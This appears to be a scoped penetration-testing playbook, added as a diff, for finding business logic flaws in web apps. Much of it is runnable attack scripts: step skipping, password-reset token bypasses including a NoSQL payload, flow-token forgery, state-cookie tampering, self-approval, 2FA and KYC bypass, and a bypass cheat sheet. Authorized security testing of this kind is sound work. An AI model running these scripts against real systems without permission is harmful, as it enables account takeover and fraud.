@@ -1,0 +1,994 @@
+================================================================================
+TASK 80 · BUSINESS LOGIC FLAWS & MULTI-STEP FLOW BYPASS
+================================================================================
+Covers testing_toolkit.txt Phase 10 Step 35
+Finding and exploiting business logic vulnerabilities.
+
+OBJECTIVE:
+- Map multi-step business flows
+- Skip steps via direct requests
+- Bypass state validation
+- Abuse workflow assumptions
+- Playwright for stateful testing
+
+================================================================================
+INPUTS
+================================================================================
+outputs/url_corpus_all_in_scope.txt        ← URL corpus
+outputs/live_base_urls.txt                 ← Live hosts
+outputs/har/common_data.txt                ← Endpoints from HAR
+outputs/har/accounts/*_auth.json           ← Auth tokens
+outputs/payment/payment_endpoints.txt      ← Payment flows (Task 79)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/bizlogic/
+├── multi_step_flows.txt            ← Mapped business flows
+├── step_skip_results.txt           ← Step bypass findings
+├── state_bypass_results.txt        ← State validation bypass
+├── workflow_abuse_results.txt      ← Workflow exploitation
+├── playwright_tests/               ← Stateful test scripts
+│   ├── checkout_bypass.js
+│   ├── registration_skip.js
+│   └── approval_bypass.js
+└── business_logic_log.txt          ← Full exploitation log
+
+================================================================================
+🧠 BUSINESS LOGIC FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+What Are Business Logic Flaws?
+───────────────────────────────────────
+Business logic vulnerabilities occur when an application's workflow
+can be manipulated in unintended ways.
+
+Unlike technical vulns (SQLi, XSS), these exploit DESIGN flaws:
+- Assumptions about user behavior
+- Missing validation between steps
+- Incorrect state management
+- Trust in client-side checks
+
+───────────────────────────────────────
+Common Business Logic Attack Patterns
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Pattern                │ Example                    │ Impact                │
+├────────────────────────┼────────────────────────────┼───────────────────────┤
+│ Step skipping          │ Go from step 1 → step 5   │ Bypass validation     │
+│ Parameter pollution    │ Add extra params          │ Override defaults     │
+│ State manipulation     │ Modify session state      │ Privilege escalation  │
+│ Flow reversal          │ Execute steps backwards   │ Bypass checks         │
+│ Parallel execution     │ Submit same form 2x       │ Duplicate benefits    │
+│ Data carryover         │ Use data from prev flow   │ Cross-flow data leak  │
+│ Workflow injection     │ Insert extra steps        │ Inject functionality  │
+│ Time-based bypass      │ Exploit timing windows    │ Bypass rate limits    │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: MAP BUSINESS FLOWS
+================================================================================
+
+───────────────────────────────────────
+1.1 Identify Multi-Step Processes
+───────────────────────────────────────
+#!/bin/bash
+# map_flows.sh
+
+mkdir -p outputs/bizlogic temp/agent1/bizlogic
+
+# Common multi-step flows
+FLOW_PATTERNS=(
+    # Registration
+    "register|signup|create.*account|join"
+    # Checkout
+    "cart|checkout|payment|order|purchase"
+    # Password reset
+    "forgot|reset.*password|recover|verify"
+    # KYC/Verification
+    "verify|kyc|identity|document|upload"
+    # Approval workflows
+    "submit|review|approve|reject|pending"
+    # Onboarding
+    "onboard|setup|configure|wizard|step"
+    # Upgrade/Downgrade
+    "upgrade|downgrade|subscription|plan"
+)
+
+echo "[*] Searching for multi-step flows..."
+
+for pattern in "${FLOW_PATTERNS[@]}"; do
+    echo "--- Pattern: $pattern ---"
+    grep -iE "$pattern" outputs/url_corpus_all_in_scope.txt | head -20
+done > outputs/bizlogic/multi_step_flows.txt
+
+───────────────────────────────────────
+1.2 Extract Flow Steps from HAR
+───────────────────────────────────────
+#!/usr/bin/env python3
+# extract_flow_from_har.py
+
+"""
+Extract multi-step flows from HAR files by analyzing request sequences
+"""
+
+import json
+import os
+from collections import defaultdict
+
+def extract_flows_from_har(har_file):
+    """Extract request sequences that look like multi-step flows"""
+    
+    with open(har_file) as f:
+        har = json.load(f)
+    
+    entries = har.get('log', {}).get('entries', [])
+    
+    # Group by URL path patterns
+    flows = defaultdict(list)
+    
+    for entry in entries:
+        url = entry.get('request', {}).get('url', '')
+        method = entry.get('request', {}).get('method', '')
+        timestamp = entry.get('startedDateTime', '')
+        
+        # Look for step indicators in URL
+        step_keywords = ['step', 'stage', 'phase', 'part', 'page']
+        for keyword in step_keywords:
+            if keyword in url.lower():
+                # Extract base path (without step number)
+                import re
+                base_path = re.sub(rf'{keyword}[-_]?\d+', f'{keyword}N', url, flags=re.I)
+                flows[base_path].append({
+                    'url': url,
+                    'method': method,
+                    'timestamp': timestamp
+                })
+    
+    return flows
+
+# Process HAR files
+har_dir = 'manual/har'
+if os.path.exists(har_dir):
+    for har_file in os.listdir(har_dir):
+        if har_file.endswith('.har'):
+            flows = extract_flows_from_har(os.path.join(har_dir, har_file))
+            for base, steps in flows.items():
+                if len(steps) > 1:
+                    print(f"[+] Flow detected: {base}")
+                    for step in sorted(steps, key=lambda x: x['timestamp']):
+                        print(f"    {step['method']} {step['url']}")
+
+───────────────────────────────────────
+1.3 Common Flow Templates
+───────────────────────────────────────
+# CHECKOUT FLOW
+# ─────────────────────────────────
+# Step 1: Add to cart     POST /api/cart/add
+# Step 2: View cart       GET  /api/cart
+# Step 3: Apply coupon    POST /api/cart/coupon
+# Step 4: Set shipping    POST /api/cart/shipping
+# Step 5: Payment info    POST /api/checkout/payment
+# Step 6: Confirm order   POST /api/checkout/confirm
+# Step 7: Success page    GET  /order/success
+
+# REGISTRATION FLOW
+# ─────────────────────────────────
+# Step 1: Email signup    POST /api/auth/signup
+# Step 2: Email verify    GET  /api/auth/verify?token=X
+# Step 3: Set password    POST /api/auth/password
+# Step 4: Profile info    POST /api/user/profile
+# Step 5: Preferences     POST /api/user/preferences
+
+# PASSWORD RESET FLOW
+# ─────────────────────────────────
+# Step 1: Request reset   POST /api/auth/forgot
+# Step 2: Email link      GET  /api/auth/reset?token=X
+# Step 3: New password    POST /api/auth/reset
+
+================================================================================
+PHASE 2: STEP SKIPPING ATTACKS
+================================================================================
+
+───────────────────────────────────────
+2.1 Direct Request to Final Step
+───────────────────────────────────────
+#!/usr/bin/env python3
+# step_skip.py
+
+"""
+Try to skip steps by directly accessing later endpoints
+"""
+
+import requests
+
+class StepSkipTester:
+    def __init__(self, auth_cookies=None, auth_headers=None):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies or {})
+        self.session.headers.update(auth_headers or {})
+        self.results = []
+    
+    def test_checkout_skip(self, base_url):
+        """Try to complete checkout without going through all steps"""
+        
+        # Define checkout steps
+        checkout_steps = [
+            ('cart/add', 'POST', {'product_id': 1, 'quantity': 1}),
+            ('cart/view', 'GET', None),
+            ('checkout/shipping', 'POST', {'address_id': 1}),
+            ('checkout/payment', 'POST', {'payment_method': 'card'}),
+            ('checkout/confirm', 'POST', {}),  # Final step
+        ]
+        
+        print("[*] Testing checkout step skipping...")
+        
+        # Test 1: Try final step directly (without any previous steps)
+        final_step = checkout_steps[-1]
+        url = f"{base_url}/api/{final_step[0]}"
+        
+        try:
+            if final_step[1] == 'POST':
+                resp = self.session.post(url, json=final_step[2], timeout=30)
+            else:
+                resp = self.session.get(url, timeout=30)
+            
+            if resp.status_code == 200:
+                if 'order' in resp.text.lower() or 'success' in resp.text.lower():
+                    print(f"[!] STEP SKIP: Final step accessible directly!")
+                    self.results.append({
+                        'flow': 'checkout',
+                        'skipped_to': final_step[0],
+                        'result': 'success'
+                    })
+        except Exception as e:
+            pass
+        
+        # Test 2: Skip intermediate steps (1 → 3 → 5)
+        for i, step in enumerate(checkout_steps):
+            if i % 2 == 0:  # Only odd steps (skip even)
+                url = f"{base_url}/api/{step[0]}"
+                try:
+                    if step[1] == 'POST':
+                        resp = self.session.post(url, json=step[2], timeout=30)
+                    else:
+                        resp = self.session.get(url, timeout=30)
+                    
+                    print(f"[+] Step {i+1} ({step[0]}): {resp.status_code}")
+                except:
+                    pass
+    
+    def test_registration_skip(self, base_url):
+        """Try to register without email verification"""
+        
+        # Try to set password without verifying email
+        endpoints = [
+            '/api/auth/password',      # Directly set password
+            '/api/user/profile',       # Directly set profile
+            '/api/user/activate',      # Directly activate
+        ]
+        
+        for endpoint in endpoints:
+            try:
+                resp = self.session.post(
+                    f"{base_url}{endpoint}",
+                    json={'password': 'Test123!', 'email': 'test@test.com'},
+                    timeout=30
+                )
+                
+                if resp.status_code in [200, 201]:
+                    print(f"[!] REGISTRATION SKIP: {endpoint} accessible")
+                    self.results.append({
+                        'flow': 'registration',
+                        'endpoint': endpoint,
+                        'result': 'accessible'
+                    })
+            except:
+                pass
+    
+    def test_password_reset_skip(self, base_url):
+        """Try to reset password without valid token"""
+        
+        # Try to reset with various token bypass attempts
+        bypass_tokens = [
+            '',                     # Empty token
+            'null',                 # Null string
+            '0',                    # Zero
+            'true',                 # Boolean
+            '*',                    # Wildcard
+            '%00',                  # Null byte
+            'undefined',            # Undefined
+            '{"$gt":""}',          # NoSQL injection
+        ]
+        
+        for token in bypass_tokens:
+            try:
+                resp = self.session.post(
+                    f"{base_url}/api/auth/reset",
+                    json={
+                        'token': token,
+                        'password': 'NewPass123!',
+                        'email': 'victim@test.com'
+                    },
+                    timeout=30
+                )
+                
+                if resp.status_code == 200:
+                    if 'success' in resp.text.lower() or 'reset' in resp.text.lower():
+                        print(f"[!] TOKEN BYPASS: {token}")
+                        self.results.append({
+                            'flow': 'password_reset',
+                            'bypass_token': token,
+                            'result': 'bypassed'
+                        })
+            except:
+                pass
+    
+    def save_results(self, output_file):
+        with open(output_file, 'w') as f:
+            for r in self.results:
+                f.write(f"{r['flow']}|{r}\n")
+
+# Main
+if __name__ == "__main__":
+    tester = StepSkipTester()
+    
+    with open('temp/agent1/live_base_urls.txt') as f:
+        for line in f:
+            base_url = line.strip()
+            print(f"\n[*] Testing: {base_url}")
+            
+            tester.test_checkout_skip(base_url)
+            tester.test_registration_skip(base_url)
+            tester.test_password_reset_skip(base_url)
+    
+    tester.save_results('outputs/bizlogic/step_skip_results.txt')
+
+───────────────────────────────────────
+2.2 Sequential Request Manipulation
+───────────────────────────────────────
+#!/bin/bash
+# sequential_bypass.sh
+
+BASE_URL="$1"
+AUTH_COOKIE="$2"
+
+echo "[*] Testing sequential request manipulation..."
+
+# Test 1: Reverse order execution
+echo "[*] Test 1: Reverse flow order"
+
+# Execute checkout in reverse
+curl -sk "$BASE_URL/api/checkout/confirm" -H "Cookie: $AUTH_COOKIE" -X POST
+curl -sk "$BASE_URL/api/checkout/payment" -H "Cookie: $AUTH_COOKIE" -X POST
+curl -sk "$BASE_URL/api/checkout/shipping" -H "Cookie: $AUTH_COOKIE" -X POST
+curl -sk "$BASE_URL/api/cart/add" -H "Cookie: $AUTH_COOKIE" -X POST -d '{"product_id":1}'
+
+# Test 2: Repeat beneficial step
+echo "[*] Test 2: Repeat coupon application"
+
+curl -sk "$BASE_URL/api/cart/coupon" -H "Cookie: $AUTH_COOKIE" -d "code=DISCOUNT10"
+curl -sk "$BASE_URL/api/cart/coupon" -H "Cookie: $AUTH_COOKIE" -d "code=DISCOUNT10"
+curl -sk "$BASE_URL/api/cart/coupon" -H "Cookie: $AUTH_COOKIE" -d "code=DISCOUNT10"
+
+# Check cart total
+curl -sk "$BASE_URL/api/cart" -H "Cookie: $AUTH_COOKIE"
+
+# Test 3: Inject extra step
+echo "[*] Test 3: Inject admin approval"
+
+curl -sk "$BASE_URL/api/admin/approve" -H "Cookie: $AUTH_COOKIE" -d '{"order_id":"123"}'
+
+================================================================================
+PHASE 3: STATE MANIPULATION
+================================================================================
+
+───────────────────────────────────────
+3.1 Session State Tampering
+───────────────────────────────────────
+#!/usr/bin/env python3
+# state_tamper.py
+
+"""
+Test manipulation of session/state variables
+"""
+
+import requests
+import base64
+import json
+
+class StateTamperTester:
+    def __init__(self, auth_cookies):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies)
+        self.results = []
+    
+    def tamper_cookie_state(self, base_url):
+        """Try to manipulate state stored in cookies"""
+        
+        # Common state cookies to look for
+        state_cookies = [
+            'checkout_step',
+            'flow_state',
+            'user_state',
+            'cart_state',
+            'order_status',
+            'verification_status',
+            'session_state',
+        ]
+        
+        for cookie_name in state_cookies:
+            # Try setting to "completed" states
+            completion_values = [
+                'complete', 'completed', 'done', 'verified',
+                'approved', 'success', 'final', '5', '99',
+                base64.b64encode(b'completed').decode(),
+                base64.b64encode(b'{"step":5,"verified":true}').decode(),
+            ]
+            
+            for value in completion_values:
+                self.session.cookies.set(cookie_name, value)
+                
+                # Try to access restricted endpoint
+                resp = self.session.get(f"{base_url}/api/order/success", timeout=30)
+                
+                if resp.status_code == 200:
+                    if 'order' in resp.text.lower():
+                        print(f"[!] STATE BYPASS: {cookie_name}={value}")
+                        self.results.append({
+                            'cookie': cookie_name,
+                            'value': value,
+                            'result': 'bypassed'
+                        })
+    
+    def tamper_hidden_fields(self, checkout_url):
+        """Manipulate hidden form fields"""
+        
+        # Hidden field manipulations
+        hidden_fields = {
+            'step': 5,
+            'current_step': 'final',
+            'state': 'complete',
+            'verified': True,
+            'email_verified': True,
+            'payment_verified': True,
+            'skip_verification': True,
+            'is_admin': True,
+            'bypass': True,
+        }
+        
+        for field, value in hidden_fields.items():
+            try:
+                resp = self.session.post(
+                    checkout_url,
+                    json={field: value},
+                    timeout=30
+                )
+                
+                if resp.status_code == 200:
+                    print(f"[+] Hidden field accepted: {field}={value}")
+                    self.results.append({
+                        'type': 'hidden_field',
+                        'field': field,
+                        'value': value
+                    })
+            except:
+                pass
+    
+    def save_results(self, output_file):
+        with open(output_file, 'w') as f:
+            for r in self.results:
+                f.write(f"{r}\n")
+
+───────────────────────────────────────
+3.2 Flow Token Manipulation
+───────────────────────────────────────
+#!/bin/bash
+# flow_token_tamper.sh
+
+BASE_URL="$1"
+AUTH_COOKIE="$2"
+
+# Many flows use tokens to track progress
+# Try to manipulate or reuse these tokens
+
+echo "[*] Testing flow token manipulation..."
+
+# Test 1: Reuse old token
+OLD_TOKEN="abc123"  # Replace with captured token
+
+curl -sk "$BASE_URL/api/checkout/confirm" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d "flow_token=$OLD_TOKEN"
+
+# Test 2: Use another user's token
+curl -sk "$BASE_URL/api/checkout/confirm" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d "flow_token=VICTIM_TOKEN"
+
+# Test 3: Forge token (if format is known)
+# Example: base64(user_id:step:timestamp)
+FORGED_TOKEN=$(echo -n "1:5:$(date +%s)" | base64)
+
+curl -sk "$BASE_URL/api/checkout/confirm" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d "flow_token=$FORGED_TOKEN"
+
+# Test 4: Token without signature
+curl -sk "$BASE_URL/api/checkout/confirm" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -H "X-Flow-Token: complete" \
+    -H "X-Step: 5"
+
+================================================================================
+PHASE 4: WORKFLOW EXPLOITATION
+================================================================================
+
+───────────────────────────────────────
+4.1 Approval Workflow Bypass
+───────────────────────────────────────
+#!/usr/bin/env python3
+# approval_bypass.py
+
+"""
+Bypass approval workflows:
+- Self-approve requests
+- Skip approval step
+- Modify approval status
+"""
+
+import requests
+
+class ApprovalBypassTester:
+    def __init__(self, auth_cookies):
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.cookies.update(auth_cookies)
+    
+    def test_self_approval(self, base_url, request_id):
+        """Try to approve own request"""
+        
+        approval_endpoints = [
+            f'/api/requests/{request_id}/approve',
+            f'/api/approve/{request_id}',
+            f'/api/admin/approve',
+            f'/api/workflow/approve',
+        ]
+        
+        for endpoint in approval_endpoints:
+            try:
+                # POST approval
+                resp = self.session.post(
+                    f"{base_url}{endpoint}",
+                    json={'request_id': request_id, 'status': 'approved'},
+                    timeout=30
+                )
+                
+                if resp.status_code == 200:
+                    if 'approved' in resp.text.lower():
+                        print(f"[!] SELF-APPROVAL: {endpoint}")
+                        return True
+                
+                # PUT approval
+                resp = self.session.put(
+                    f"{base_url}{endpoint}",
+                    json={'status': 'approved'},
+                    timeout=30
+                )
+                
+                if resp.status_code == 200:
+                    print(f"[!] SELF-APPROVAL via PUT: {endpoint}")
+                    return True
+                
+            except:
+                pass
+        
+        return False
+    
+    def test_status_manipulation(self, base_url, request_id):
+        """Try to change request status directly"""
+        
+        status_values = [
+            'approved', 'completed', 'verified', 'accepted',
+            '1', 'true', 'yes', 'done', 'final'
+        ]
+        
+        for status in status_values:
+            try:
+                # PATCH status
+                resp = self.session.patch(
+                    f"{base_url}/api/requests/{request_id}",
+                    json={'status': status},
+                    timeout=30
+                )
+                
+                if resp.status_code == 200:
+                    print(f"[!] STATUS CHANGED: {status}")
+                    return True
+            except:
+                pass
+        
+        return False
+
+───────────────────────────────────────
+4.2 Two-Factor Bypass
+───────────────────────────────────────
+#!/bin/bash
+# 2fa_bypass.sh
+
+BASE_URL="$1"
+AUTH_COOKIE="$2"
+
+echo "[*] Testing 2FA bypass..."
+
+# Test 1: Skip 2FA endpoint
+curl -sk "$BASE_URL/api/dashboard" -H "Cookie: $AUTH_COOKIE"
+curl -sk "$BASE_URL/api/account" -H "Cookie: $AUTH_COOKIE"
+curl -sk "$BASE_URL/api/settings" -H "Cookie: $AUTH_COOKIE"
+
+# Test 2: Remove 2FA requirement
+curl -sk "$BASE_URL/api/auth/2fa/disable" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -X POST
+
+# Test 3: Bypass via parameter
+curl -sk "$BASE_URL/api/auth/login" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d '{"username":"user","password":"pass","skip_2fa":true}'
+
+curl -sk "$BASE_URL/api/auth/login" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d '{"username":"user","password":"pass","2fa_verified":true}'
+
+# Test 4: Null/empty 2FA code
+curl -sk "$BASE_URL/api/auth/2fa/verify" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d '{"code":""}'
+
+curl -sk "$BASE_URL/api/auth/2fa/verify" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d '{"code":null}'
+
+curl -sk "$BASE_URL/api/auth/2fa/verify" \
+    -H "Cookie: $AUTH_COOKIE" \
+    -d '{"code":"000000"}'
+
+───────────────────────────────────────
+4.3 KYC/Verification Bypass
+───────────────────────────────────────
+#!/usr/bin/env python3
+# kyc_bypass.py
+
+"""
+Bypass KYC (Know Your Customer) verification
+"""
+
+import requests
+
+def test_kyc_bypass(base_url, auth_cookies):
+    """Test various KYC bypass techniques"""
+    
+    session = requests.Session()
+    session.verify = False
+    session.cookies.update(auth_cookies)
+    
+    bypasses = []
+    
+    # Test 1: Direct access to verified features
+    verified_endpoints = [
+        '/api/withdraw',
+        '/api/transfer',
+        '/api/trading/advanced',
+        '/api/limits/increase',
+    ]
+    
+    for endpoint in verified_endpoints:
+        try:
+            resp = session.get(f"{base_url}{endpoint}", timeout=30)
+            if resp.status_code == 200:
+                print(f"[+] Accessible without KYC: {endpoint}")
+                bypasses.append(('direct_access', endpoint))
+        except:
+            pass
+    
+    # Test 2: Set verification status
+    status_endpoints = [
+        '/api/user/kyc/status',
+        '/api/user/verification',
+        '/api/account/verified',
+    ]
+    
+    for endpoint in status_endpoints:
+        try:
+            resp = session.post(
+                f"{base_url}{endpoint}",
+                json={'status': 'verified', 'level': 'premium'},
+                timeout=30
+            )
+            if resp.status_code == 200:
+                print(f"[!] KYC status changed: {endpoint}")
+                bypasses.append(('status_change', endpoint))
+        except:
+            pass
+    
+    # Test 3: Parameter manipulation
+    try:
+        resp = session.get(
+            f"{base_url}/api/user/profile",
+            params={'kyc_verified': 'true', 'verification_level': '3'},
+            timeout=30
+        )
+        if 'verified' in resp.text.lower():
+            print("[!] KYC parameter accepted")
+            bypasses.append(('parameter', 'kyc_verified'))
+    except:
+        pass
+    
+    return bypasses
+
+================================================================================
+PHASE 5: PLAYWRIGHT STATEFUL TESTS
+================================================================================
+
+───────────────────────────────────────
+5.1 Checkout Bypass Test
+───────────────────────────────────────
+// outputs/bizlogic/playwright_tests/checkout_bypass.js
+
+const { test, expect } = require('@playwright/test');
+
+test.describe('Checkout Flow Bypass Tests', () => {
+    
+    test('should require all steps to complete checkout', async ({ page }) => {
+        // Go directly to confirmation without previous steps
+        await page.goto('/checkout/confirm');
+        
+        // Should be redirected or show error
+        await expect(page).not.toHaveURL(/confirm/);
+        // OR
+        await expect(page.locator('.error')).toContainText(/cart.*empty|step/i);
+    });
+    
+    test('should prevent skipping payment step', async ({ page }) => {
+        // Add item to cart
+        await page.goto('/products/1');
+        await page.click('#add-to-cart');
+        
+        // Try to skip to confirmation
+        await page.goto('/checkout/confirm');
+        
+        // Should require payment info
+        await expect(page.locator('.error')).toBeVisible();
+    });
+    
+    test('should prevent order without shipping address', async ({ page }) => {
+        // Add item and go to checkout
+        await page.goto('/products/1');
+        await page.click('#add-to-cart');
+        await page.goto('/checkout');
+        
+        // Try to submit without shipping
+        await page.click('#confirm-order');
+        
+        // Should show shipping required error
+        await expect(page.locator('.error')).toContainText(/shipping|address/i);
+    });
+    
+    test('should not apply coupon multiple times', async ({ page }) => {
+        await page.goto('/cart');
+        
+        // Apply coupon first time
+        await page.fill('#coupon-code', 'DISCOUNT10');
+        await page.click('#apply-coupon');
+        
+        const firstTotal = await page.locator('#cart-total').textContent();
+        
+        // Try to apply same coupon again
+        await page.fill('#coupon-code', 'DISCOUNT10');
+        await page.click('#apply-coupon');
+        
+        const secondTotal = await page.locator('#cart-total').textContent();
+        
+        // Total should be same (coupon not stacked)
+        expect(firstTotal).toBe(secondTotal);
+    });
+});
+
+───────────────────────────────────────
+5.2 Registration Skip Test
+───────────────────────────────────────
+// outputs/bizlogic/playwright_tests/registration_skip.js
+
+const { test, expect } = require('@playwright/test');
+
+test.describe('Registration Flow Tests', () => {
+    
+    test('should require email verification', async ({ page }) => {
+        // Register new account
+        await page.goto('/register');
+        await page.fill('#email', 'test@example.com');
+        await page.fill('#password', 'Password123!');
+        await page.click('#submit');
+        
+        // Try to access dashboard
+        await page.goto('/dashboard');
+        
+        // Should redirect to verification page
+        await expect(page).toHaveURL(/verify|confirm/);
+    });
+    
+    test('should not allow profile setup without verification', async ({ page }) => {
+        // Register but don't verify
+        await page.goto('/register');
+        await page.fill('#email', 'test2@example.com');
+        await page.fill('#password', 'Password123!');
+        await page.click('#submit');
+        
+        // Try to access profile setup directly
+        await page.goto('/profile/setup');
+        
+        // Should require verification first
+        await expect(page).not.toHaveURL(/profile.*setup/);
+    });
+    
+    test('should require valid verification token', async ({ page }) => {
+        // Try to verify with invalid token
+        await page.goto('/verify?token=invalid123');
+        
+        // Should show error
+        await expect(page.locator('.error')).toContainText(/invalid|expired/i);
+    });
+});
+
+───────────────────────────────────────
+5.3 Approval Workflow Test
+───────────────────────────────────────
+// outputs/bizlogic/playwright_tests/approval_bypass.js
+
+const { test, expect } = require('@playwright/test');
+
+test.describe('Approval Workflow Tests', () => {
+    
+    test('user should not be able to approve own request', async ({ page }) => {
+        // Login as requester
+        await page.goto('/login');
+        await page.fill('#username', 'requester');
+        await page.fill('#password', 'password');
+        await page.click('#login');
+        
+        // Create a request
+        await page.goto('/requests/new');
+        await page.fill('#request-details', 'Test request');
+        await page.click('#submit');
+        
+        // Get request ID
+        const requestUrl = page.url();
+        const requestId = requestUrl.match(/requests\/(\d+)/)[1];
+        
+        // Try to approve own request
+        await page.goto(`/requests/${requestId}/approve`);
+        
+        // Should be denied
+        await expect(page.locator('.error')).toContainText(/cannot.*own|unauthorized/i);
+    });
+    
+    test('should require manager approval for high-value requests', async ({ page }) => {
+        // Create high-value request
+        await page.goto('/requests/new');
+        await page.fill('#amount', '10000');
+        await page.click('#submit');
+        
+        // Check status - should require manager approval
+        await expect(page.locator('.status')).toContainText(/pending.*manager|review/i);
+    });
+});
+
+───────────────────────────────────────
+5.4 Run Playwright Tests
+───────────────────────────────────────
+#!/bin/bash
+# run_playwright_tests.sh
+
+cd outputs/bizlogic/playwright_tests
+
+# Install if needed
+npm init -y 2>/dev/null
+npm install @playwright/test 2>/dev/null
+
+# Configure target URL
+export BASE_URL="https://target.com"
+
+# Run tests
+npx playwright test --reporter=html
+
+# Results in playwright-report/
+echo "[*] Results saved to playwright-report/"
+
+================================================================================
+PHASE 6: DOCUMENT RESULTS
+================================================================================
+
+───────────────────────────────────────
+6.1 Consolidate Findings
+───────────────────────────────────────
+#!/bin/bash
+# consolidate_bizlogic.sh
+
+echo "# Business Logic Exploitation Results" > outputs/bizlogic/business_logic_log.txt
+echo "# Generated: $(date)" >> outputs/bizlogic/business_logic_log.txt
+echo "" >> outputs/bizlogic/business_logic_log.txt
+
+echo "## Multi-Step Flows Mapped" >> outputs/bizlogic/business_logic_log.txt
+cat outputs/bizlogic/multi_step_flows.txt 2>/dev/null >> outputs/bizlogic/business_logic_log.txt
+
+echo "" >> outputs/bizlogic/business_logic_log.txt
+echo "## Step Skip Results" >> outputs/bizlogic/business_logic_log.txt
+cat outputs/bizlogic/step_skip_results.txt 2>/dev/null >> outputs/bizlogic/business_logic_log.txt
+
+echo "" >> outputs/bizlogic/business_logic_log.txt
+echo "## State Bypass Results" >> outputs/bizlogic/business_logic_log.txt
+cat outputs/bizlogic/state_bypass_results.txt 2>/dev/null >> outputs/bizlogic/business_logic_log.txt
+
+echo "" >> outputs/bizlogic/business_logic_log.txt
+echo "## Workflow Abuse Results" >> outputs/bizlogic/business_logic_log.txt
+cat outputs/bizlogic/workflow_abuse_results.txt 2>/dev/null >> outputs/bizlogic/business_logic_log.txt
+
+================================================================================
+SUMMARY & STATISTICS
+================================================================================
+
+echo ""
+echo "=========================================="
+echo "TASK 80 SUMMARY - Business Logic"
+echo "=========================================="
+echo "Multi-step flows found:  $(wc -l < outputs/bizlogic/multi_step_flows.txt 2>/dev/null || echo 0)"
+echo "Step skip findings:      $(wc -l < outputs/bizlogic/step_skip_results.txt 2>/dev/null || echo 0)"
+echo "State bypass findings:   $(wc -l < outputs/bizlogic/state_bypass_results.txt 2>/dev/null || echo 0)"
+echo "Workflow abuse findings: $(wc -l < outputs/bizlogic/workflow_abuse_results.txt 2>/dev/null || echo 0)"
+
+================================================================================
+⚠️ COMMON MISTAKES TO AVOID ⚠️
+================================================================================
+
+❌ Only testing happy path
+   → Test all edge cases and error conditions
+
+❌ Assuming server validates all steps
+   → Always verify step dependencies
+
+❌ Ignoring state management
+   → Session and cookie states can be manipulated
+
+❌ Not testing approval workflows
+   → Self-approval is a common business logic flaw
+
+❌ Missing parallel execution tests
+   → Race conditions in workflows can be exploited
+
+================================================================================
+📚 REFERENCE: BUSINESS LOGIC CHEAT SHEET
+================================================================================
+
+Step Skipping:
+  Direct request to /checkout/confirm
+  Skip verification: /profile/setup (no email verify)
+
+State Manipulation:
+  Cookie: checkout_step=5
+  Hidden: verified=true, step=final
+
+Workflow Bypass:
+  Self-approve: POST /requests/123/approve
+  Status change: PATCH /requests/123 {status: approved}
+
+Token Manipulation:
+  Reuse: flow_token=old_valid_token
+  Forge: flow_token=base64(user:step:time)
+
+2FA Bypass:
+  skip_2fa=true
+  code=000000
+  code=null/empty
